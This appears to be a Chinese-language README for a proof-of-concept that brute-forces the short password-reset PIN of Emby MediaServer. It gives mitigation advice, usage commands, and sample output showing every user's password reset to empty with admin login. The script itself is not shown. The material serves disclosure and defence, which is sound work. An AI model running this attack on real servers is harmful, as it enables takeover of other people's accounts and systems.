# Emby MediaServer <= 4.9.1.80/4.9.2.6 beta 任意用户密码重置

也是老洞了，但一直没修，甚至最新版也存在，重置密码的 Pin 过短导致可以爆破。

临时缓解办法：在服务器上创建一个名为 `/config/passwordreset.txt`（具体路径看服务器系统）的 *目录*， 权限改为 444 或更低，也考虑在反向代理上拦截 /emby/Users/ForgotPassword 和 /emby/Users/ForgotPassword/Pin 请求，并增加速率限制。

## POC 用法

PIN 默认是 0721，一般能在几分钟内爆破出来，所有用户密码会重置为空，能直接登录管理后台。

```bash
$ docker run -d -p 8096:8096 emby/embyserver:v4.9.1.80
$ python main.py <server> [-u <user>] [-p <pin>]
$ python main.py http://localhost:8096

第1次尝试中
...
第5391次尝试中

===== 成功！ =====
重置的用户名：sdaflfjjkefnkjan
使用的PIN码：0721
总尝试次数：5391次
总用时：14.64秒
```

## 参考文献

https://www.exploit-db.com/exploits/41947

https://emby.media/support/articles/Admin-Password-Reset.html

https://dev.emby.media/reference/RestAPI/UserService/postUsersForgotpassword.html

https://dev.emby.media/reference/RestAPI/UserService/postUsersForgotpasswordPin.html

http://localhost:8096/web/index.html#!/startup/forgotpasswordpin.html
